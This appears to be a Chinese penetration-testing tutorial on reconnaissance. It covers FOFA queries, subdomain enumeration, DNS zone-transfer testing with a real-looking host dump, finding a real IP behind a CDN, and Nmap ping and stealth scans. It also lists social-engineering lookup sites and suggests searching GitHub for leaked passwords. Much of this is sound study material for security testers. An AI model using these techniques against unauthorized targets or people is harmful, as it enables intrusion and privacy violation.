1header=&quot;jboss&quot; body=”abc” 从html正文中搜索abc正文包含Hacked by 1body=&quot;Hacked by&quot; domain=”qq.com” 搜索根域名带有qq.com的网站1domain=&quot;qq.com&quot; host=”.gov.cn” 从url中搜索.gov.cn1host=&quot;.gov.cn&quot; 教育网站1host=&quot;.edu.cn&quot; port=”443” 查找对应443端口的资产1port=&quot;443&quot; ip=”1.1.1.1” 搜索ip信息139.98.209.64 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)1protocol=&quot;https&quot; 搜索指定城市的资产1city=&quot;Beijing&quot; 搜索指定行政区的资产1region=&quot;Zhejiang&quot; 搜索指定国家(编码)的资产1country=&quot;CN&quot; 搜索证书(https或者imaps等)中带有google的资产1cert=&quot;google&quot; 搜索FTP协议中带有users文本的资产1banner=users &amp;&amp; protocol=ftp 搜索所有协议资产，支持subdomain和service两种1type=service 搜索Windows资产1os=windows 搜索IIS 7.5服务器1server==&quot;Microsoft-IIS/7.5&quot; 搜索海康威视设备1app=&quot;海康威视-视频监控&quot; 时间范围段搜索1after=&quot;2017&quot; &amp;&amp; before=&quot;2017-10-01&quot; 搜索指定org(组织)的资产1org=&quot;Amazon.com, Inc.&quot; 搜索指定udp协议的资产1base_protocol=&quot;udp&quot; 高级搜索可以使用括号 和 &amp;&amp; || !=等符号，如 12345title=&quot;powered by&quot; &amp;&amp; title!=discuztitle!=&quot;powered by&quot; &amp;&amp; body=discuz( body=&quot;content=\&quot;WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot; 规则探索与发现https://fofa.so/subject https://fofa.so/library 子域名收集域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。 例如通过某公司官网的主域名，可以暴力破解出该公司内部系统（如OA、CRM等等）的访问地址。 爆破在线爆破工具phpinfo.me/domain 本地工具爆破subDomainsBrutehttps://github.com/lijiejie/subDomainsBrute 每秒可扫描3000个域名 Layer 子域名挖掘机 法师经典作品，操作简单容易上手 https://github.com/euphrat1ca/LayerDomainFinder API搜索引擎site: domain OneForAll👊 OneForAll是一款功能强大的子域收集工具 自己动手丰衣足食Django 编写 Web 漏洞扫描器挖坑记录： https://www.sqlsec.com/2020/05/webscan.html 域名探测功能发现比较流行的子域名探测功能 one for all 用的也是很多 API 接口，于是打算使用第三方服务来获取子域名，这样获取的速度会很快。 因为这些子域名是存入数据库的，所以也就顺便增加了域名监控功能，每次扫描可以统计出新增的域名数量。域名探测所使用的 6 个接口分别如下，大家也可以直接拿去使用，做好对应的数据提取就可以了： 123456789101112131415161718# 爱站https://baidurank.aizhan.com/baidu/&#123;domain&#125;/# 百度云观测http://ce.baidu.com/index/getRelatedSites?site_address=&#123;domain&#125;# hackertargethttps://api.hackertarget.com/hostsearch/?q=&#123;domain&#125;# IP138https://site.ip138.com/&#123;domain&#125;/domain.htm# crt.sh SSL 证书反查https://crt.sh/?q=%25.&#123;domain&#125;# 千寻url = &apos;https://www.dnsscan.cn/dns.html&apos;datas = &#123;&quot;ecmsfrom&quot;: &apos;8.8.8.8&apos;, &quot;show&quot;: &apos;none&apos;, &quot;keywords&quot;: domain&#125; API接口找子域名比爆破更好用的原因： 大厂SRC 2级往上子域名很多，用字典爆破难以成功 大厂会有WAF拦截 域名访问超时直接丢弃结果的，然后再获取网页标题，这个在实际的信息收集中比较实用的，一些 404 403 的资产可以跳过，减少无意义的浪费时间。 证书透明度(CT)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。 CT会要求CA将数字证书(SSL/TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会提供给用户一个查找某域名颁发的所有数字证书途径。数字证书中会包含子域名相关的信息。 DNS 域传送漏洞什么是DNSDNS(Domain Name System，域名管理系统) 是万维网 WWW 的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。 DNS服务器使用的TCP/UDP端口号是53。 最常用的DNS记录有以下几类： 记录类别 说明 A记录 IP 地址记录,记录一个域名对应的 IP 地址 AAAA 记录 IPv6 地址记录，记录一个域名对应的 IPv6 地址 CNAME 记录 别名记录，记录一个主机的别名 MX 记录 电子邮件交换记录，记录一个邮件域名对应的IP地址 NS 记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR 记录 反向记录，也即从 IP 地址到域名的一条记录 TXT 记录 记录域名的相关文本信息 nslookup 命令nslookup 命令的使用。仅使用该命令，就可完成 DNS 域传送的测试。 指定 DNS 查询域名的 IP 地址： 1234567~ nslookup www.sqlsec.com 114.114.114.114Server: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 查询域名所使用的 DNS 服务器： 1234567$ nslookup www.sqlsec.com -type=nsServer: 100.100.2.136Address: 100.100.2.136#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 验证一下看看，是否这个 DNS 服务器开启了 53 端口： 12345678910$ nmap 100.100.2.136Starting Nmap 6.40 ( http://nmap.org ) at 2020-07-25 14:32 CSTNmap scan report for 100.100.2.136Host is up (0.00028s latency).Not shown: 999 filtered portsPORT STATE SERVICE53/tcp open domainNmap done: 1 IP address (1 host up) scanned in 9.26 seconds 域传送漏洞DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 Nslookup 命令检测： 1234567891011 # 查询解析此域名的dns服务器nslookup -type=ns xxx.xxx.cn# 进入交互nslookup # 指定dns服务器server dns.xxx.xx.cn# 列出域信息ls xxx.xxx.cn 详细案例的输出结果： 12345678910111213141516171819202122232425262728293031D:\&gt;nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; server dns.nwpu.edu.cn默认服务器: dns.nwpu.edu.cnAddress: 202.117.80.2&gt; ls nwpu.edu.cn[dns.nwpu.edu.cn] nwpu.edu.cn. NS server = dns.nwpu.edu.cn nwpu.edu.cn. NS server = dns1.nwpu.edu.cn nwpu.edu.cn. NS server = dns2.nwpu.edu.cn nwpu.edu.cn. NS server = dns3.nwpu.edu.cn * A 222.24.192.99(... 省略大量的记录)npunecas NS server = webcomp.npunecas.nwpu.edu.cn webcomp.npunecas A 202.117.85.146 nwpu03 A 202.117.80.4 nwpudb2 A 222.24.210.149 poj A 192.168.0.248 portal A 61.150.43.10 portal1 A 222.24.192.31 portal2 A 222.24.192.32 rei A 202.117.85.10 saip NS server = saipserver.saip.nwpu.edu.cn saipserver.saip A 202.117.85.72 test A 222.24.192.29 yzb A 202.117.85.3 zsb A 202.117.87.130 zygx A 202.117.80.9 C段与旁站(渐渐没落)基础知识什么是 IP 地址IP 地址在网络中用于标识一个节点（或者网络设备的接口），一个IPv4地址有32位。 192. 168. 10. 1 11000000 10101000 00001010 00000001 IP地址在最底层运算的时候依然采用的是二进制的方式。 IP地址的类别0.0.0.0 - 255.255.255.255 一共有2的32次方个，因为数量很庞大，所以需要科学的管理。我们一般把IP地址划分为如下5个类别： 正常可以被我们使用的只有A、B、C类A 类 00000001 - 01111111 : 0 - 1270 是不合法的 IP 地址，所以范围从 1 开始，又因为 127 是一个比较特殊的地址，回环地址，所以 A 类的第一个 8 bit 的值范围为 1-126 B 类 10000000 - 10111111 : 128 - 191C 类 11000000 - 11011111 : 192 - 223所以在内网渗透中，遇到 10 开头的 IP 地址，一般我们称呼它为 A 类地址，172 开头的IP地址为 B 类地址，192 开头的IP地址为 C 类地址。 IP 地址的网络和主机部分IP 地址和我们实际生活中的地址类似： 浙江省杭州市滨江区西兴街道联慧街188号安恒大厦浙江省 | 杭州市 滨江区 西兴街道联慧街188号网络号 | 主机号所以在网络中间对于转发信息的设备来说，他们不关心主机号，所以路由是不关心主机部分的，先把信息送到目标网络区域，然后交给对于的网络区域的设备来处理。 所以一个 IP 地址为：10.1.1.1 ，那么 10.0.0.0 为这个 IP 地址的网络号，1.1.1 为这个 IP 地主的主机号。 网络掩码 网络掩码为 32 bits，与 IP 地址的位数是一样的 网络掩码在二进制的表示上是一堆连续的 1 后面接连续的 0 值为 1 的 bit 对应 IP 地址中的网络位；为 0 的 bit 对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络与主机位 A 段 B 段 C 段黑客所说的C段是什么意思12192.168.1.1/24192.168.1.1 - 192.168.1.255 子网掩码的位数总共有 32 个, /24表示前 24 个为1，其它 8 位都是 0所以 B 段 可以用下面来进行表示： 12172.1.1.1/16172.1.1.1 - 172.1.255.255 A 段 可以用下面来进行表示： 1210.1.1.1/810.1.1.1 - 10.255.255.255 一般渗透测试中常用于 C 段探测，内网中会对 B 段进行探测扫描，A 段资产太庞大，探测成本太高。 多地 ping 原理：根据不同地区CDN加速提高响应速度，因此ip会不一样 必应接口(没落)在线查询http://www.bug8.me/bing/bing.php 在线网站使用必应接口查询 C 段和旁站很方便，但是速度方面有点欠缺 K8 C段旁注工具 6.0https://github.com/k8gege/K8tools K8 C 段旁注查询工具 V6.0，但是速度要比在线快很多，解压密码为：k8team 爱站https://dns.aizhan.com/ 数量上还是比较优势的，而且查询速度也会比较快。 Fofa获取到域名的 IP 地址之后，可以使用 Fofa 来反查域名： 1ip=&quot;119.23.84.105&quot; &amp;&amp; type=&quot;subdomain&quot; 工具更多适用于内网，因为外网基本上开放端口都比较少，而且带云 WAF。 HTTPScanhttps://github.com/zer0h/httpscan 12pip install IPypython httpscan.py 220.191.202.0/24 http端口查询+标题获取首先实用快速端口扫描工具： 然后提取出ip地址信息，再放到爱站里面取查询，这样可以得出一个最完整的c段信息。 当旁站不是CDN的时候，适用于内网，可以使用批量获取网页标题工具来进行查询： 服务器信息查询CDN 介绍CDN（Content Delivery Network，内容分发网络）将源站的内容发布到接近用户的网络“边缘”，用户可以就近获取所需数据，不仅降低了网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力。 传统的网络访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向LocalDNS查询域名的ip地址 2.LocalDns向RootDNS 查询域名的授权服务器 3.RootDNS查询域名记录后，回应给LocalDNS 4.LocalDNS将得到的域名ip地址，回应给客户端 5.用户得到域名ip地址后，访问站点服务器 6.站点服务器应答请求，将内容返回给客户端 CDN 访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向 LocalDns 查询域名的 ip 地址 2.LocalDns 向 ROOT DNS 查询域名的授权服务器 3.ROOT DNS 将域名授权DNS记录回应给 LocalDns 4.LocalDns 得到域名记录后，向智能调度DNS查询域名的ip地址 5.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns 6.LocalDns 将得到的域名ip地址，回应给 用户端 7.用户得到域名 ip 地址后，访问站点服务器 8.CDN节点服务器应答请求，将内容返回给客户端 CDN 判断与绕过ping 命令直接 ping 查询地址信息： 有些是直接可以看到waf、cdn等字样的域名 很多厂商可能让 www 使用cdn，空域名不使用 CDN 缓存。所以直接 ping xxx.com 可能就能得到真实IP slookup 查询1234567891011121314151617181920# 用了 CDN➜ ~ nslookup www.baidu.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:www.baidu.com canonical name = www.a.shifen.com.Name: www.a.shifen.comAddress: 180.101.49.11Name: www.a.shifen.comAddress: 180.101.49.12# 没有用 CDN➜ ~ nslookup www.sqlsec.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 域名解析结果为多个 ip，多半使用了CDN，是不真实的 ip。 多地 ping 爱站超级 ping: https://ping.aizhan.com/ 站长之家多地 ping: http://ping.chinaz.com/ 解析历史记录查询查询 ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。 https://viewdns.info/ https://x.threatbook.cn/ https://sitereport.netcraft.com/ 子域名绕过很多网站主站的访问量会比较大。所以往往主站都是挂了CDN的，但是分站就不一定了，毕竟CDN要钱，而且也不便宜,企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用，结合之前的子域名爆破来进行收集。 利用站点功能主动发起请求一些网站提供注册服务，可能会验证邮件，还有 RSS 订阅邮件、忘记密码等等 可能服务器本身自带 sendmail 可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）通过邮件发送地址往往也能得到服务器 IP 利用网站漏洞如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、Struts2、网页源代码泄露、svn 信息泄露信、Github 信息泄露等 若存在 Web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip，例如 XSS 等 国外访问国内的 CDN 往往只会针对国内用户访问加速，但是国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP 社工信息收集whois查询whois.bugscaner.com whois.aizhan.com whois.chinaz.com 注册网站查询www.reg007.com 密码泄露查询https://haveibeenpwned.com TG 群信息收集1关键词 inurl:t.me 开房记录查询http://www.cxjlkf.com 国家职业资格证查询http://zscx.osta.org.cn 其他查询身份证查询http://www.2cha.com 经纬度查询http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 微信搜索https://weixin.sogou.com 泄露网站查询https://haveibeenpwned.com/PwnedWebsites 邮件泄露查询https://www.hotsheet.com/inoitsu/ 密码强度检测https://passwordsecurity.info https://haveibeenpwned.com/Passwords Github 信息收集可以使用谷歌搜索语法： 也可以使用 Github 自带搜索（推荐）： linux密码 123mysql数据库passworddb_pass 点code查 https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt 主动信息收集Nmap 与 MasscanNmap 介绍官网：https://nmap.org/ Nmap 的英文全称是“Nmap Network Mapper”，中文翻译过来就是“网络映射器”。 Nmap 是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。 端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。 端口介绍#### TCP 端口 TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包 的时候重发，还可以对次序乱掉的分包进行顺序控制。 UDP 端口UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。 也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。 协议端口端口如同是一个房间的门，这个房间有多少个门呢？有65536 个之多，也就是说端口的取值范围是 0~65535 个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如 80、139、445 等。 端口 协议 21 FTP 22 SSH 23 Tenet 服务 25 SMTP 邮件传输协议 80 HTTP 服务相关端口 110 POP3 E-mail 135 共享文件或共享打印机 443 HTTP 服务相关常用端口 SSL 445 文件或打印机共享服务 1433 MS SQL Server 数据库 1521 Oracle 数据库 3306 MySQL 数据库 3389 Windows 远程桌面服务 5432/5433 PostgreSQL 数据库端口 6379 Redis 存储默认端口 7001 Weblogic 默认端口 8080 HTTP 服务常用端口 8000 - 8100 HTTP 服务常用端口 9200 Elasticsearch 默认端口 11211 Memcached 分布式缓存系统端口 端口状态Nmap 进行端口扫描的时候，Nmap 会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。 状态 说明 Open 端口对外开放 Closed 端口对外关闭 Fitered 无法判断 被防火墙设备拦截过滤 nfiltered 未被过滤 使用 ACK 扫描才可能出现这种情况 Open\ Filtered 不能确定开放或者过滤 可能被专业设备阻止探测了 Closed\ Filtered 不能确定关闭还是被过滤 主机发现本节所用到的 Nmap 命令表： 选项 解释 -sP Ping 扫描 -P0/-Pn 无 Ping 扫描 -PS TCP SYN Ping 扫描 -PA TCP ACK Ping 扫描 -PU UDP Ping 扫描 -PE;-PP;-PM ICMP Ping Types 扫描 -PR ARP Ping 扫描 -sL 列表扫描 -6 扫描 IPv6 地址 –traceroute 路由跟踪 -PY SCTP INIT Ping 扫描 一个简单的扫描该扫描方式可以快递地对 IP 或者域名进行扫描： 可以使用 –packet-trace 查看协议扫描的细节： 1nmap 10.11.29.138 --packet-trace 可以使用 -v 查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。 1nmap 10.11.29.138 -v 查看Linux源： 1cat /etc/apt/sources.list sudo apt-get update 自动使用最近源，指定是多此一举 使用 Zenmap 进行扫描Zenmap 是 Nmap 官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性。 Ping 扫描Ping 扫描只进行 Ping，然后显示出在线的主机，可以比较快速地获取目标信息而不会被轻易发现。 123456789101112131415nmap 10.20.24.1/24 -sPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:59 CSTNmap scan report for 10.20.24.15Host is up (0.016s latency).Nmap scan report for 10.20.24.231Host is up (0.0021s latency).Nmap scan report for 10.20.24.236Host is up (0.00068s latency).Nmap scan report for 10.20.24.238Host is up (0.0019s latency).Nmap scan report for 10.20.24.239Host is up (0.0018s latency).Nmap scan report for 10.20.24.244Host is up (0.00087s latency).Nmap done: 256 IP addresses (6 hosts up) scanned in 3.36 seconds 也可以直接使用 Ping 命令来发现局域网主机： Linux 主机 123456789101112#!/bin/baship=&quot;172.16.114.&quot;echo &quot;ping log:&quot; &gt; ./ping.txtfor i in &#123;1..254&#125;do ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;doneecho &quot;wait 5s....&quot;sleep 5cat ./ping.txtcat ./ping.txt | wc -l Windows 主机 1for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I 无 Ping 扫描用户防火墙禁止 Ping 的情况下，可以使用 -P0 或者 -Pn可以避免被防火墙发现。 nmap无法突破windows防火墙，但是内网中很多域为方便都是不开防火墙的，所以nmap依旧吃香。 开防火墙后扫描3306（已知开放）： 1nmap 10.11.29.138 -p 3306 -Pn TCP SYN Ping 扫描通常情况下，Nmap 默认 Ping 扫描是使用 TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，我们可以使用 TCP SYN Ping 扫描来对目标主机进行存活判断： 123456789nmap 10.20.24.244 -PSStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:54 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 有时候这种扫描结果不不准确，这个时候需要制定一个端口或端口范围来避免这种情况。 TCP ACK Ping 扫描使用 -PA选项可以进行 TCP ACK Ping 扫描，它与 TCP SYN Ping 扫描比较类似，区别在于 TCP 的标志位是 ACK 而不是 SYN，使用这种方式可以探测阻止 SYN 包或 ICMP Echo 请求的主机。 123456789➜ ~ nmap 10.20.24.244 -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:02 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 743 closed ports, 254 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 也可以同时使用-PS与-PA 既发送 SYN 又发送 ACK，提高通过防火墙的概率： 123456789➜ ~ nmap 10.20.24.244 -PS -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:03 CSTNmap scan report for 10.20.24.244Host is up (0.00040s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc UDP Ping 扫描需要使用 root 权限来运行，使用 -PU 选项可以发送一个空的冷门的 UDP 报文到指定端口，如果目标主机响应则返回一个 ICMP 端口不可达错误，如果目标主机不是存活状态则会返回各种 ICMP 错误信息。 12345678910➜ ~ sudo nmap 10.20.24.244 -PUPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:07 CSTNmap scan report for 10.20.24.244Host is up (0.00012s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 尝试手动来验证看看： 1sudo nmap 10.20.24.244 -PU --packet-trace |grep 5900 CMP Ping Types 扫描使用-PE、-PP、-PM选项可以进行 ICMP Ping Types 扫描。ICMP（Internet Control Message Protocol）是 Internet 控制报文协议。是 TCP/IP 协议族的一个子协议，用于在 IP 主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 ICMP Echo 扫描-PE 选项可以发起一个 ICMP Echo 扫描来探测目标主机是否在线，因为很多主机的防火墙会禁止这些报文，所以外网扫描基本上不好用，可以用于内网扫描。 12345678➜ ~ sudo nmap 10.20.24.244 -PEStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 时间戳 Ping 扫描大多数防火墙可能不允许 ICMP Echo 请求，但是由于配置不当可能回复 ICMP 时间错请求，所以可以使用 -PP 时间戳扫描来确定目标主机是否存活。 12345678➜ ~ sudo nmap 10.20.24.244 -PPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.000029s latency).Not shown: 809 closed ports, 189 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 地址掩码 Ping 扫描这种扫描方式会试图用备选的 ICMP 登记 Ping 指定主机，通常有不错的穿透防火墙的效果。 123456789➜ ~ sudo nmap 10.20.24.244 -PMPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:05 CSTNmap scan report for 10.20.24.244Host is up (0.00011s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ARP Ping 扫描-PR选项通常在扫描局域网时使用，ARP（Address Resolution Protocol）地址解析协议，是根据 IP 地址获取物理地址的一个 TCP/IP 协议，在内网中使用 ARP Ping 扫描方式比较搞笑，在本地局域网中防火墙基本上不会禁止 ARP 请求，所以比其他 Ping 扫描效率都更高。 1234567891011121314151617181920➜ ~ nmap 10.20.24.244 -PRStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:10 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 746 closed ports, 252 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 2.64 seconds➜ ~ nmap 10.20.24.244Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:11 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 7.73 seconds 扫描列表显示扫描的所有主机的列表 1234567891011121314➜ ~ nmap 10.20.24.10-20 -sLStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:19 CSTNmap scan report for 10.20.24.10Nmap scan report for 10.20.24.11Nmap scan report for 10.20.24.12Nmap scan report for 10.20.24.13Nmap scan report for 10.20.24.14Nmap scan report for 10.20.24.15Nmap scan report for 10.20.24.16Nmap scan report for 10.20.24.17Nmap scan report for 10.20.24.18Nmap scan report for 10.20.24.19Nmap scan report for 10.20.24.20Nmap done: 11 IP addresses (0 hosts up) scanned in 0.01 seconds 可以使用 Masscan 批量生成 IP 地址表： 123masscan -sL 10.0.0.0/24 &gt; c段.txtmasscan -sL 10.0.0.0/16 &gt; b段.txtmasscan -sL 10.0.0.0/8 &gt; a段.txt 扫描一个 IPv6 地址IPv6 是 Internet Protocol Version 6 的缩写，用于替代现在用的 IPv4 的下一代 IP 协议，Nmap 很早就支持对 IPv6 的扫描，使用 -6 选项就可以进行对 IPv6 的扫描。 12345678➜ ~ nmap -6 1::224:11cStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:34 CSTNmap scan report for 1::224:11cHost is up (0.00028s latency).Not shown: 968 closed ports, 30 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec5900/tcp open vnc 路由跟踪使用 –traceroute 可以轻松地查出从本地计算机到目标之间所经过的网络节点，并可以查看过各个节点的时间： 1234567891011121314151617181920212223242526272829➜ ~ sudo nmap www.sqlsec.com --traceroutePassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:35 CSTNmap scan report for www.sqlsec.com (121.196.37.183)Host is up (0.0018s latency).Not shown: 991 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open http111/tcp open rpcbind443/tcp open https445/tcp filtered microsoft-ds888/tcp open accessbuilder3306/tcp open mysql4444/tcp filtered krb524TRACEROUTE (using port 3389/tcp)HOP RTT ADDRESS1 1.41 ms 10.20.24.12 0.38 ms 172.16.0.13 6.50 ms 61.164.47.1934 ...5 1.70 ms 61.164.31.2186 2.51 ms 115.236.101.737 1.78 ms 45.112.223.298 1.92 ms 103.41.142.1739 ... 1011 1.77 ms 121.196.37.183 SCTP INIT Ping 扫描SCTP（Stream Control Transmission Protocol，流控制传输协议）是在 2000 年定义的一个传输层，SCTP 可以看作是 TCP 协议的改进。 12345678910➜ ~ sudo nmap 10.20.24.15 -PYStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:40 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook 探索网络本节所用到的 Nmap 命令表： 选项 解释 -T 指定时间模板 -p 指定端口 -sS TCP SYN 扫描 -sU UDP 扫描 -sN;-sF;-sX 隐蔽扫描 -sA TCP ACK 扫描 -sW TCP 窗口扫描 时间模板在 Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用 -T 选项及数字 (0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) 选项 说明 -T0 偏执的 非常慢，用于 IDS 躲避 -T1 鬼祟的 缓慢的扫描，用于 IDS 躲避 -T2 文雅的 降低了扫描速度以使用更少的带宽和目标主机资源 -T3 普通的 默认模式 根据目标的反应自动调整时间 -T4 野蛮的 假设用户具有可靠的网络从而加速扫描，可能会漏扫 -T5 疯狂的 极速扫描，为了获得速度而牺牲准确性 指定端口可以指定端口号进行扫描，可以是一个端口也可以是一个范围： 12345678910111213141516171819202122232425262728293031323334353637➜ ~ nmap 10.20.24.1/24 -p 22Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:34 CSTNmap scan report for 10.20.24.15Host is up (0.0077s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.231Host is up (0.00050s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.236Host is up (0.00051s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.238Host is up (0.00061s latency).PORT STATE SERVICE22/tcp closed sshNmap scan report for 10.20.24.239Host is up (0.00070s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.244Host is up (0.0019s latency).PORT STATE SERVICE22/tcp closed ssh TCP SYN 扫描比较常用的扫描方式，也被称为半开放扫描，因为不用进行 TCP 连接 3 次握手，所以速度比较快，平均一秒可以扫描上千个端口，而且相对来说也比较隐蔽，很难被防火墙或管理员发现，因为不会进行 TCP 连接，如果出现被过滤的情况，可以考虑使用 SYN 扫描，可以很明确地区分出端口的开放状态。 1234567891011➜ ~ sudo nmap 10.20.24.15 -sSPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:41 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook TCP 连接扫描当 -sS 不能使用的时候，可以使用 -sT 更加基础、稳定的扫描方式。 UDP 扫描因为要等待目标主机响应，所以速度比较慢，一般配合 -p 指定端口来使用，否则很耗费时间。 隐蔽扫描 -sN Null 扫描 -sF FIN 扫描 -sX Xmas 扫描这些扫描方式会躲过一些无状态防火墙的过滤，效果会更隐蔽。 TCP ACK 扫描确定是无法判断端口是开放还是过滤的。unfiltered 表明 ACK 报文不能到达，filtered 表示不响应的端口。 TCP 窗口扫描类似于ACK 扫描，通过返回的窗口大小数据判断目标端口是否开放或者关闭。扫描结果是不准确的，如果 100 个端口里面只有 2 个关闭的，那很可能是开放的。 指纹探测Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。 本节所使用的命令表： 选项 说明 -sV 版本探测 -A 更加详细直观的扫描 –version-intensity 设置扫描强度 1~9 默认为 7 –version-light 轻量级扫描 强度为 2 –version-all 重量级扫描 强度为 9 -O 启用操作系统探测 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 版本探测➜ ~ nmap 10.20.24.244 -sVStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:12 CSTNmap scan report for 10.20.24.244Host is up (0.30s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp 